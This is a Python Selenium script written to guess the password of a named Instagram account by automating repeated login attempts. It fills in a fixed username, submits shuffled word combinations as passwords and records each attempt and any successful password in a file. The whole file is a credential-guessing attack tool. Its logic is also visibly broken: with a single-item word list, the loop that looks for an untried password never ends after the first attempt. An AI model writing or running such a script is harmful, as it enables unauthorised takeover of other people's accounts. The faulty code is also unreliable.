import random
import datetime
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# initialize the driver
driver = webdriver.Chrome()

# go to the login page
driver.get("https://www.instagram.com/accounts/login/")

# wait for the username and password fields to load
username_input = WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.NAME, "username")))
password_input = WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.NAME, "password")))

your_username = "dt1dt2d"
username_input.send_keys(your_username)
# words = ["Love", "Emiway", "@", "#"]
words = ["Love@#Emiway"]
# get current time
start_time = datetime.datetime.now()

# open the output file to write the password attempts and results
output_file = open("password_attempts.txt", "w")

# try different passwords
passwords_tried = set()
while True:
    # generate a new password if the previous one has already been tried
    while True:
        random.shuffle(words)
        your_password = ''.join(words)
        if your_password not in passwords_tried:
            break
    passwords_tried.add(your_password)

    # enter the password and submit the form
    password_input.clear()
    for i in range(len(your_password)):
        password_input.send_keys(Keys.BACKSPACE)
    password_input.send_keys(your_password)
    password_input.send_keys(Keys.RETURN)

    # wait for the page to load
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, "cmbtv")))

    # check if login is successful
    if driver.current_url != "https://www.instagram.com/accounts/login/":
        # print success message and write results to output file
        print(f"Login successful! Password: {your_password}")
        output_file.write(f"Login successful! Password: {your_password}\n")
        break
    else:
        # dismiss the "Save Your Login Info?" popup if it appears
        try:
            not_now_btn = WebDriverWait(driver, 3).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Not Now')]")))
            not_now_btn.click()
        except:
            pass

        # print failure message and write password attempt to output file
        print(f"Login unsuccessful. Attempted password: {your_password}")
        output_file.write(f"Login unsuccessful. Attempted password: {your_password}\n")

# close the output file
output_file.close()

# get end time and calculate elapsed time
end_time = datetime.datetime.now()
elapsed_time = end_time - start_time

# format elapsed time in hh:mm:ss format
elapsed_time_str = str(elapsed_time).split(".")[0]

# print total time elapsed and number of password attempts
print(f"Elapsed time: {elapsed_time_str}, Number of password attempts: {len(passwords_tried)}")
